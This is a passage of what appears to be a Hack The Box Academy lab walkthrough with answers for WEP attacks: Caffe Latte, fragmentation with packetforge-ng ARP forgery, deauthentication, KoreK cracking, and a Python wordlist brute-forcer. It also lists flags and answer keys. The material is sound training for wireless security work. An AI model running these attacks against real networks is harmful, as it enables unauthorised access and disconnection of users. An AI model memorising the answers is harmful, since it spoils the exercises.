        0x0010:  ffff ffff ffff 8001 d148 1d00 4ae4 569e  .........H..J.V.
        0x0020:  6108 ecb0 174d 9142 bd16 d695 7508 8653  a....M.B....u..S
        0x0030:  ac70 ea83 ea7d d5c7 66b0 df7f 7fe7 c5f9  .p...}..f.....
        0x0040:  ce4e 090b                                .N..

Use this packet ? y

Saving chosen packet in replay_src-1127-071825.cap
You should also start airodump-ng to capture replies.

Sent 150239 packets... (500 pps)
```

After a while, students will terminate both processes (`aireplay-ng` and `airodump-ng`). Subsequently, students will use `aircrack-ng` to retrieve the key while specifying the `Student-01.cap` packet capture and the MAC address of the access point:

Code: shell

```shell
aircrack-ng -b D8:D6:3D:EB:29:D5 Student-01.cap
```

```
wifi@WiFiIntro:~$ aircrack-ng -b D8:D6:3D:EB:29:D5 Student-01.cap

Reading packets, please wait...
Opening Student-01.cap
Read 609701 packets.

1 potential targets                       Got 297118 out of 295000 IVsStarting PTW attack with 297118 ivs.
                         KEY FOUND! [ {hidden} ] 
Attack wDecrypted correctly: 100%00 captured ivs.
```

Answer: `1A:64:8C:9F:E2`

# The Cafe Latte Attack

## Question 1

### "Perform the Cafe Latte attack on the WiFi network. What is the WEP KEY for this network? (Format: XX:XX:XX:XX:XX)"

After spawning the target, students will establish an RDP connection using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.128]─[htb-ac-8414@htb-uy7uykiwcb]─[~]
└──╼ [★]$ xfreerdp /v:10.129.46.93 /u:wifi /p:wifi /dynamic-resolution 

[03:38:55:095] [98547:98548] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[03:38:55:396] [98547:98548] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[03:38:55:396] [98547:98548] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[03:38:55:411] [98547:98548] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[03:38:55:411] [98547:98548] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[03:38:55:411] [98547:98548] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Subsequently, students will open a terminal and use `airmon-ng` to enable monitor mode on the `wlan0` interface. Note throughout the exercise, a total of four terminals will be used:

Code: shell

```shell
sudo airmon-ng start wlan0
```

```
wifi@WiFiIntro:~$ sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    182 avahi-daemon
    199 wpa_supplicant
    205 avahi-daemon
    217 NetworkManager

PHY	Interface	Driver		Chipset

phy1	wlan0		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)
```

Students will use `airodump-ng` to capture the traffic on channel one and save it to a file named `Student`:

Code: shell

```shell
sudo airodump-ng wlan0mon -c 1 -w Student
```

```
wifi@WiFiIntro:~$ sudo airodump-ng wlan0mon -c 1 -w Student

06:56:30  Created capture file "Student-01.cap".

CH  1 ][ Elapsed: 18 s ][ 2024-11-27 09:41

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 D8:D6:3D:EB:29:D5  -47 100      212        0    0   1   11   WEP  WEP         HackTheWifi                        

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 D8:D6:3D:EB:29:D5  BE:BC:63:C4:BF:DC  -29    0 - 1      0        1         HackTheWifi
```

Students will open a new terminal and use `aireplay-ng` to perform a Caffe Latte attack (`-6`) targeting the MAC addresses found in the `BSSID` and `STATION` columns in the `airodump-ng` output, respectively. Once a packet is found, students will use that packet. Note the MAC addresses may change upon target spawn or reset:

Code: shell

```shell
sudo aireplay-ng -6 -D -b D8:D6:3D:EB:29:D5 -h BE:BC:63:C4:BF:DC wlan0mon
```

```
wifi@WiFiIntro:~$ sudo aireplay-ng -6 -D -b D8:D6:3D:EB:29:D5 -h
BE:BC:63:C4:BF:DC wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
	ifconfig wlan0mon hw ether BE:BC:63:C4:BF:DC
Saving ARP requests in replay_arp-1127-094350.cap
You should also start airodump-ng to capture replies.
Read 50 packets (0 ARPS, 0 ACKs), send 0 packets...(0 pps)
```

Next, students will open another terminal and use `airbase-ng` to act as a listener for the Caffe Latte attack, specifying channel 1, the MAC address of the access point, the name of the access point (`HackTheWifi`), interface, enabling the WEP mode with `-W`, and the `-L` to initiate the Cafe Latte attack:

Code: shell

```shell
sudo airbase-ng -c 1 -a D8:D6:3D:EB:29:D5 -e "HackTheWifi" wlan0mon -W 1 -L
```

```
wifi@WiFiIntro:~$ sudo airbase-ng -c 1 -a D8:D6:3D:EB:29:D5 -e "HackTheWifi" wlan0mon -W 1 -L

09:47:16  Created tap interface at0
09:47:16  Trying to set MTU on at0 to 1500
09:47:16  Trying to set MTU on wlan0mon to 1800
09:47:16  Access Point with BSSID D8:D6:3D:EB:29:D5 started.
```

Students will open another terminal and use `aireplay-ng` to perform deauthentication, while specifying the access point MAC address (`-a`) and the connected client's MAC address (`-c`):

Code: shell

```shell
sudo aireplay-ng -0 10 -a D8:D6:3D:EB:29:D5 -c BE:BC:63:C4:BF:DC wlan0mon
```

```
wifi@WiFiIntro:~$ sudo aireplay-ng -0 10 -a D8:D6:3D:EB:29:D5 -c BE:BC:63:C4:BF:DC wlan0mon

09:50:21  Waiting for beacon frame (BSSID: D8:D6:3D:EB:29:D5) on channel 1
09:50:21  Sending 64 directed DeAuth (code 7). STMAC: [BE:BC:63:C4:BF:DC] [ 0| 0 ACKs]
09:50:22  Sending 64 directed DeAuth (code 7). STMAC: [BE:BC:63:C4:BF:DC] [ 0| 0 ACKs]
09:50:22  Sending 64 directed DeAuth (code 7). STMAC: [BE:BC:63:C4:BF:DC] [ 0| 0 ACKs]
09:50:23  Sending 64 directed DeAuth (code 7). STMAC: [BE:BC:63:C4:BF:DC] [ 0| 0 ACKs]
09:50:23  Sending 64 directed DeAuth (code 7). STMAC: [BE:BC:63:C4:BF:DC] [ 0| 0 ACKs]
09:50:24  Sending 64 directed DeAuth (code 7). STMAC: [BE:BC:63:C4:BF:DC] [ 0| 0 ACKs]
09:50:24  Sending 64 directed DeAuth (code 7). STMAC: [BE:BC:63:C4:BF:DC] [ 0| 0 ACKs]
09:50:25  Sending 64 directed DeAuth (code 7). STMAC: [BE:BC:63:C4:BF:DC] [ 0| 0 ACKs]
09:50:25  Sending 64 directed DeAuth (code 7). STMAC: [BE:BC:63:C4:BF:DC] [ 0| 0 ACKs]
09:50:26  Sending 64 directed DeAuth (code 7). STMAC: [BE:BC:63:C4:BF:DC] [ 0| 0 ACKs]
```

Students will notice in the `airbase-ng` terminal (and process) the start of the `Caffe-Latte` attack has begun:

```
wifi@WiFiIntro:~$ sudo airbase-ng -c 1 -a D8:D6:3D:EB:29:D5 -e "HackTheWifi" wlan0mon -W 1 -L

09:47:16  Created tap interface at0
09:47:16  Trying to set MTU on at0 to 1500
09:47:16  Trying to set MTU on wlan0mon to 1800
09:47:16  Access Point with BSSID D8:D6:3D:EB:29:D5 started.
09:50:39  Client BE:BC:63:C4:BF:DC associated (WEP) to ESSID: "HackTheWifi"
09:50:39  Starting Caffe-Latte attack against BE:BC:63:C4:BF:DC at 100 pps.
```

After a while, students will stop the processes (`airbase-ng`, `aireplay-ng`, and `airodump-ng`) with the key combination of `CTRL + C`. Subsequently, students will use `aircrack-ng` to retrieve the key by specifying the MAC address of the access point and the `Student-01.cap` packet capture file:

Code: shell

```shell
aircrack-ng -b D8:D6:3D:EB:29:D5 Student-01.cap
```

```
wifi@WiFiIntro:~$ aircrack-ng -b D8:D6:3D:EB:29:D5 Student-01.cap

Reading packets, please wait...
Opening Student-01.cap
Read 294993 packets.

1 potential targets       Got 54520 out of 50000 IVsStarting PTW attack with 54520 ivs.
Attack will be restarted every 5000 captured ivs.

                               Aircrack-ng 1.6 

                 [00:00:00] Tested 3 keys (got 54469 IVs)

   KB    depth   byte(vote)
    0    0/  1   1A(73472) 60(63744) 34(63488) 4F(63488) 31(63232) 
    1    0/  1   2B(77568) 1F(64768) 71(62976) 21(62464) B8(62208) 
    2    0/  1   3C(72704) A1(65024) B6(63488) C3(62976) BA(62464) 
    
<SNIP>

                     KEY FOUND! [ {hidden} ] 
	Decrypted correctly: 100%
```

Answer: `1A:2B:3C:4D:5E`

# Additional WEP Cracking

## Question 1

### "Use aircrack-ng to crack the WEP key from the file located at "/opt/WEP.ivs" and submit the found key as answer. (Format: XX:XX)"

After spawning the target, students will establish an RDP connection using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.128]─[htb-ac-8414@htb-splgsker1o]─[~]
└──╼ [★]$ xfreerdp /v:10.129.231.119 /u:wifi /p:wifi /dynamic-resolution

[05:23:27:868] [6718:6719] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[05:23:27:169] [6718:6719] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[05:23:27:169] [6718:6719] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[05:23:27:184] [6718:6719] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[05:23:27:184] [6718:6719] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[05:23:27:184] [6718:6719] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Students will open a terminal and use `aircrack-ng` against the `WEP.ivs` file located in the `/opt` directory to retrieve the key using the Korek WEP cracking method (`-K`):

Code: shell

```shell
aircrack-ng -K /opt/WEP.ivs
```

```
wifi@WiFiIntro:~$ aircrack-ng -K /opt/WEP.ivs 

Reading packets, please wait...
Opening /opt/WEP.ivs
Read 567298 packets.

   #  BSSID              ESSID                     Encryption

   1  00:11:95:91:78:8C                            WEP (0 IVs)

Choosing first network as target.

Reading packets, please wait...
Opening /opt/WEP.ivs
Read 567298 packets.

1 potential targets

                               Aircrack-ng 1.6 

                 [00:00:10] Tested 1921 keys (got 566693 IVs)

   KB    depth   byte(vote)
    0    0/  1   AE(  50) 11(  20) 71(  20) 0D(  12) 10(  12) 
    1    1/  2   5B(  31) BD(  18) F8(  17) E6(  16) 35(  15) 
    2    0/  3   7F(  31) 74(  24) 54(  17) 1C(  13) 73(  13) 
    3    0/  1   3A( 148) EC(  20) EB(  16) FB(  13) 81(  12) 
    
<SNIP>

             KEY FOUND! [ {hidden} ] 
	Decrypted correctly: 0%
```

Answer: `AE:5B:7F:3A:03:D0:AF:9B:F6:8D:A5:E2:C70`

# Additional WEP Cracking

## Question 2

### "Perform the advanced WEP cracking as described in this section to decrypt the file located at "/opt/WEP-01.cap" and submit the 5-character password."

Students will reuse the Python3 script from the section and will comment out the `print(f"{ln}: Trying Key: {key} Hex: {hex_key}")` function to print out only data related to the key once found, saving the Python3 code into a file (`brute.py`):

Code: python

```python
import sys
import binascii
import re
from subprocess import Popen, PIPE
import time

# Start timer
start_time = time.time()

# File paths
cap_file = '/opt/WEP-01.cap'
wordlist_path = '/opt/1000000-password-seclists.txt'
wordlist = []

# Read wordlist file to a list
with open(wordlist_path, 'r') as f:
    wordlist = f.readlines()

# Iterate over the wordlist
for ln, word in enumerate(wordlist, start=1):
    # Clean the line to remove non-alphanumeric characters
    key = re.sub(r'\W+', '', word)

    # Filter wordlist to only keep 5-character long words
    if len(key) != 5 :
        continue

    # Encode the WEP key to bytes and convert to hexadecimal
    hex_key = binascii.hexlify(key.encode('utf-8'))

    # Print the current attempt
    # print(f"{ln}: Trying Key: {key} Hex: {hex_key}")

    # Run airdecap-ng with the current WEP key
    p = Popen(['/usr/bin/airdecap-ng', '-w', hex_key, cap_file], stdout=PIPE)
    output = p.stdout.read().decode("utf-8")

    # Check if the key was successful
    if int(output.split('\n')[5][-1]) > 0:
        print(f"Success! WEP key found: {key}")
        end_time = time.time()
        print(f"Total time: {end_time - start_time:.6f} seconds")
        sys.exit(0)

# If no key was found
print("No WEP key found")
```

Subsequently, students will execute the Python3 script as root to retrieve the WEP key:

Code: shell

```shell
sudo python3 brute.py
```

```
wifi@WiFiIntro:~$ sudo python3 brute.py

Success! WEP key found: {hidden}
Total time: 8.176249 seconds
```

Answer: `xampp`

# Wired Equivalent Privacy Attacks - Skills Assessment

## Question 1

### "What is the name of the target BSSID?"

After spawning the target, students will establish an RDP connection using the credentials `wifi:wifi`:

Code: shell

```shell
xfreerdp /v:STMIP /u:wifi /p:wifi /dynamic-resolution
```

```
┌─[eu-academy-6]─[10.10.14.128]─[htb-ac-8414@htb-splgsker1o]─[~]
└──╼ [★]$ xfreerdp /v:10.129.231.118 /u:wifi /p:wifi /dynamic-resolution 

[05:42:58:428] [36074:36075] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Central
[05:42:58:728] [36074:36075] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[05:42:58:728] [36074:36075] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[05:42:58:742] [36074:36075] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[05:42:58:742] [36074:36075] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[05:42:58:742] [36074:36075] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Subsequently, students will open a terminal and use `airmon-ng` to enable monitor mode on the `wlan0` interface. Note throughout the exercise, a total of four terminals will be used:

Code: shell

```shell
sudo airmon-ng start wlan0
```

```
wifi@WiFiIntro:~$ sudo airmon-ng start wlan0

Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    182 avahi-daemon
    199 wpa_supplicant
    205 avahi-daemon
    217 NetworkManager

PHY	Interface	Driver		Chipset

phy1	wlan0		htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)
```

Students will use `airodump-ng` to capture the traffic on channel one and save it to a file named `Student`, and they will find the name of the access point in the `ESSID` column:

Code: shell

```shell
sudo airodump-ng wlan0mon -c 1 -w Student
```

```
wifi@WiFiIntro:~$ sudo airodump-ng wlan0mon -c 1 -w Student

12:20:48  Created capture file "Student-01.cap".

 CH  1 ][ Elapsed: 0 s ][ 2024-11-27 12:20 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 B2:A6:3D:EB:23:A3  -47 100       49        0    0   1   11   WEP  WEP         {hidden}                                                   

<SNIP>
```

Answer: `PixelForge`

# Wired Equivalent Privacy Attacks - Skills Assessment

## Question 2

### "What is the WEP KEY for this network? (Format: XX:XX:XX:XX:XX)"

Students will open a new terminal and use `aireplay-ng` to perform a fragmentation attack targeting the MAC addresses found in the `BSSID` and `STATION` columns in the `airodump-ng` output, respectively. Once a packet is found, students will use that packet. Note the MAC addresses may change upon target spawn or reset:

Code: shell

```shell
sudo aireplay-ng -5 -b B2:A6:3D:EB:23:A3 -h 86:32:38:C0:A9:89 wlan0mon
y
```

```
wifi@WiFiIntro:~$ sudo aireplay-ng -5 -b B2:A6:3D:EB:23:A3 -h 86:32:38:C0:A9:89 wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
	ifconfig wlan0mon hw ether 86:32:38:C0:A9:89
12:24:49  Waiting for beacon frame (BSSID: B2:A6:3D:EB:23:A3) on channel 1
12:24:49  Waiting for a data packet...
Read 258 packets...

        Size: 40, FromDS: 0, ToDS: 1 (WEP)

              BSSID  =  B2:A6:3D:EB:23:A3
          Dest. MAC  =  B2:A6:3D:EB:23:A3
         Source MAC  =  86:32:38:C0:A9:89

        0x0000:  0841 3a01 b2a6 3deb 23a3 8632 38c0 a989  .A:...=.#..28...
        0x0010:  b2a6 3deb 23a3 500d 9369 bc00 d78a c6e5  ..=.#.P..i......
        0x0020:  7e30 74e3 88e9 3a1f                      ~0t...:.

Use this packet ? y

Saving chosen packet in replay_src-1127-122516.cap
12:25:19  Data packet found!
12:25:19  Sending fragmented packet
12:25:19  Got RELAYED packet!!
12:25:19  Trying to get 384 bytes of a keystream
12:25:19  Got RELAYED packet!!
12:25:19  Trying to get 1500 bytes of a keystream
12:25:19  Got RELAYED packet!!
Saving keystream in fragment-1127-122519.xor
```

Next, students will use `tcpdump` to identify the source and IP destination addresses using the packet capture saved with a unique name from `aireplay-ng`. Note that the IP addresses may not be obtained due to the nature of the attack.

Code: shell

```shell
tcpdump -s 0 -n -e -r replay_src-1127-122516.cap 
```

```
wifi@WiFiIntro:~$ tcpdump -s 0 -n -e -r replay_src-1127-122516.cap 

reading from file replay_src-1127-122516.cap, link-type IEEE802_11 (802.11), snapshot length 65535
12:25:16.935440 BSSID:b2:a6:3d:eb:23:a3 SA:86:32:38:c0:a9:89 DA:b2:a6:3d:eb:23:a3 Data IV:bc6993
```

Students will proceed to forge an ARP request with `packetforge-ng` using the previously captured keystream as a `.xor` file, specifying the access point's MAC address and the MAC address of the connected client while choosing the `255.255.255.255` IP addresses for both, designating them as broadcast addresses:

Code: shell

```shell
packetforge-ng -0 -a B2:A6:3D:EB:23:A3 -h 86:32:38:C0:A9:89 -k 255.255.255.255 -l 255.255.255.255 -y fragment-1127-122519.xor -w forgedarp.cap
```

```
wifi@WiFiIntro:~$ packetforge-ng -0 -a B2:A6:3D:EB:23:A3 -h 86:32:38:C0:A9:89 -k 255.255.255.255 -l 255.255.255.255 -y fragment-1127-122519.xor -w forgedarp.cap

Wrote packet to: forgedarp.cap
```

Next, students will use `aireplay-ng` in an interactive replay mode (`-2`) while specifying the forged packet and the MAC address of the connected client and use this packet:

Code: shell

```shell
sudo aireplay-ng -2 -r forgedarp.cap -h 86:32:38:C0:A9:89 wlan0mon
y
```

```
wifi@WiFiIntro:~$ sudo aireplay-ng -2 -r forgedarp.cap -h 86:32:38:C0:A9:89 wlan0mon

The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
	ifconfig wlan0mon hw ether 86:32:38:C0:A9:89

        Size: 68, FromDS: 0, ToDS: 1 (WEP)

              BSSID  =  B2:A6:3D:EB:23:A3
          Dest. MAC  =  FF:FF:FF:FF:FF:FF
         Source MAC  =  86:32:38:C0:A9:89

        0x0000:  0841 0201 b2a6 3deb 23a3 8632 38c0 a989  .A....=.#..28...
        0x0010:  ffff ffff ffff 8001 e872 0a00 ab45 1a47  .........r...E.G
        0x0020:  89d6 df94 8061 b1e4 a984 3f2c a4eb 0f46  .....a....?,...F
        0x0030:  d2c8 f9e7 e1cd 6b2d a61c ef3a 877d e02c  ......k-...:.}.,
        0x0040:  ad35 95ff                                .5..

Use this packet ? y

Saving chosen packet in replay_src-1127-122637.cap
You should also start airodump-ng to capture replies.

Sent 150000 packets...(499 pps)
```

After a while, students will terminate both processes (`airplay-ng` and `airodump-ng`) with the key combination of `CTRL + C`. Subsequently, they will use `aircrack-ng` along with the access point's MAC address and the packet capture `Student-01.cap` to retrieve the key:

Code: shell

```shell
aircrack-ng -b B2:A6:3D:EB:23:A3 Student-01.cap
```

```
wifi@WiFiIntro:~$ aircrack-ng -b B2:A6:3D:EB:23:A3 Student-01.cap

Reading packets, please wait...
Opening Student-01.cap
Read 468162 packets.

1 potential targets      Got 156023 out of 155000 IVsStarting PTW attack with 156023 ivs.
                     KEY FOUND! [ {hidden} ] 
	Decrypted correctly: 100%
```

Answer: `1B:2A:5A:4C:6A`

# Wired Equivalent Privacy Attacks - Skills Assessment

## Question 3

### "Connect to the WiFi network using the found key and retrieve the flag from 192.168.1.1."

Students will proceed disabling the `wlan0mon` interface using `airmon-ng`:

Code: shell

```shell
sudo airmon-ng stop wlan0mon
```

```
wifi@WiFiIntro:~$ sudo airmon-ng stop wlan0mon

PHY	Interface	Driver		Chipset

phy1	wlan0mon	htb80211_chipset	HTB ChipSet of 802.11 radio(s) for mac80211

		(mac80211 station mode vif enabled on [phy1]wlan0)

		(mac80211 monitor mode vif disabled for [phy1]wlan0mon)
```

Next, students will use the obtained key and remove the semicolons:

Code: shell

```shell
echo '1B:2A:5A:4C:6A' | tr -d ":"
```

```
wifi@WiFiIntro:~$ echo '1B:2A:5A:4C:6A' | tr -d ":"

1B2A5A4C6A
```

Subsequently, students will create a configuration file for further connecting to the access point using `wpa_supplicant` by specifying the name of the ESSID in the `ssid` variable and the key in the `wep_key0` variable:

Code: shell

```shell
cat << EOF > student-wep.conf
network={
	ssid="PixelForge"
    key_mgmt=NONE
    wep_key0=1B2A5A4C6A
    wep_tx_keyidx=0
}
EOF
```

```
wifi@WiFiIntro:~$ cat << EOF > student-wep.conf
network={
        ssid="PixelForge"
    key_mgmt=NONE
    wep_key0=1B2A5A4C6A
    wep_tx_keyidx=0
}
EOF
```

Students will use `wpa_supplicant` to connect to the access point using the `student-wep.conf` configuration file and the `wlan0` interface:

Code: shell

```shell
sudo wpa_supplicant -c student-wep.conf -i wlan0
```

```
wifi@WiFiIntro:~$ sudo wpa_supplicant -c student-wep.conf -i wlan0

Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
nl80211: Could not set interface 'p2p-dev-wlan0' UP
nl80211: deinit ifname=p2p-dev-wlan0 disabled_11b_rates=0
p2p-dev-wlan0: Failed to initialize driver interface
p2p-dev-wlan0: CTRL-EVENT-DSCP-POLICY clear_all
P2P: Failed to enable P2P Device interface
wlan0: SME: Trying to authenticate with b2:a6:3d:eb:23:a3 (SSID='PixelForge' freq=2412 MHz)
wlan0: Trying to associate with b2:a6:3d:eb:23:a3 (SSID='PixelForge' freq=2412 MHz)
wlan0: Associated with b2:a6:3d:eb:23:a3
wlan0: CTRL-EVENT-CONNECTED - Connection to b2:a6:3d:eb:23:a3 completed [id=0 id_str=]
wlan0: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
```

In a different terminal, students will use `dhclient` to obtain an IP address from the access point on the `wlan0` interface:

Code: shell

```shell
sudo dhclient wlan0
```

```
wifi@WiFiIntro:~$ sudo dhclient wlan0
```

Subsequently, students will use `wget` to obtain the `index.html` holding the flag from the `192.168.1.1` host:

```shell
wget http://192.168.1.1
cat index.html
```
```
wifi@WiFiIntro:~$ wget http://192.168.1.1

--2024-11-27 12:45:36--  http://192.168.1.1/
Connecting to 192.168.1.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 33 [text/html]
Saving to: ‘index.html’

index.html          100%[===================>]      33  --.-KB/s    in 0s      

2024-11-27 12:45:36 (4.66 MB/s) - ‘index.html’ saved [33/33]

wifi@WiFiIntro:~$ cat index.html 

{hidden}
```

Answer: `4c48e724be394b5ab14e776b2af08193`